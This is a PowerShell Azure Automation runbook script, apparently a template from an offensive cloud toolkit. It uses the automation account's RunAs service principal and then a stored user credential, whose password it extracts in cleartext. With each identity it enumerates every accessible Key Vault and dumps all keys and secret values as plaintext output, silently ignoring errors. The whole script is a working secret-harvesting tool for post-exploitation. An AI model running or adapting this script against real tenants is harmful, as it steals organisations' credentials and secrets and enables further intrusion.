$ErrorActionPreference = "SilentlyContinue"

# Start RunAs Process
$connectionName = "AzureRunAsConnection"
$servicePrincipalConnection = Get-AutomationConnection -Name $connectionName
    
# Connect AzureRM
Connect-AzureRmAccount -ServicePrincipal -Tenant $servicePrincipalConnection.TenantId -ApplicationId $servicePrincipalConnection.ApplicationID -CertificateThumbprint $servicePrincipalConnection.CertificateThumbprint | out-null
    
# Try to read KeyVaults
$vaults = Get-AzureRmKeyVault
foreach ($vault in $vaults){
    $vaultName = $vault.VaultName
    try{
        $keys = Get-AzureKeyVaultKey -VaultName $vault.VaultName -ErrorAction Stop
        # Dump Keys
        foreach ($key in $keys){
            $keyname = $key.Name
            $keyValue = Get-AzureKeyVaultKey -VaultName $vault.VaultName -Name $key.Name
            # Write out keys - format Vault:Type:Type2:Name:Value
            Write-Output "$($vaultName)`tKEY`t$($keyValue.Key.Kty)`t$($keyValue.Name)`t$($keyValue.Key)"
        }
    }
    catch{}

    # Dump Secrets
    try{$secrets = Get-AzureKeyVaultSecret -VaultName $vault.VaultName -ErrorAction Stop
        foreach ($secret in $secrets){
            $secretname = $secret.Name
            Try{
                $secretValue = Get-AzureKeyVaultSecret -VaultName $vault.VaultName -Name $secret.Name -ErrorAction Stop
                $secretType = $secretValue.ContentType
                # Write Out Secrets - format Vault:Type:Type2:Name:Value
                Write-Output "$($vaultName)`tSECRET`t$($secretType)`t$($secretValue.Name)`t$($secretValue.SecretValueText)"
                }
            Catch{}
        }
    }
    catch{}
}

#------------------- Start PSCred Section -------------------

$myCredential = Get-AutomationPSCredential -Name TEMPLATECREDENTIAL

if($myCredential -ne $null){
    # Start AutoCred Process
    $userName = $myCredential.UserName
    $password = $myCredential.GetNetworkCredential().Password
        
    # Set up credential object
    $PWord = ConvertTo-SecureString -String $password -AsPlainText -Force
    $Credential = New-Object -TypeName "System.Management.Automation.PSCredential" -ArgumentList $userName, $PWord

    $ErrorActionPreference = "Stop"

    # Try to auth as regular user, not as an SPN, that happened above with the RunAs
    Try{Connect-AzureRMAccount -Credential $Credential}
    Catch{break}

    # Try to read KeyVaults
    $vaults = Get-AzureRmKeyVault
    foreach ($vault in $vaults){
        $vaultName = $vault.VaultName
        try{
            $keys = Get-AzureKeyVaultKey -VaultName $vault.VaultName -ErrorAction Stop
            # Dump Keys
            foreach ($key in $keys){
                $keyname = $key.Name
                $keyValue = Get-AzureKeyVaultKey -VaultName $vault.VaultName -Name $key.Name
                # Write out keys - format Vault:Type:Type2:Name:Value
                Write-Output "$($vaultName)`tKEY`t$($keyValue.Key.Kty)`t$($keyValue.Name)`t$($keyValue.Key)"
            }
        }
        catch{}

        # Dump Secrets
        try{$secrets = Get-AzureKeyVaultSecret -VaultName $vault.VaultName -ErrorAction Stop
            foreach ($secret in $secrets){
                $secretname = $secret.Name
                Try{
                    $secretValue = Get-AzureKeyVaultSecret -VaultName $vault.VaultName -Name $secret.Name -ErrorAction Stop
                    $secretType = $secretValue.ContentType
                    # Write Out Secrets - format Vault:Type:Type2:Name:Value
                    Write-Output "$($vaultName)`tSECRET`t$($secretType)`t$($secretValue.Name)`t$($secretValue.SecretValueText)"
                    }
                Catch{}
            }
        }
        catch{}
    }    
}

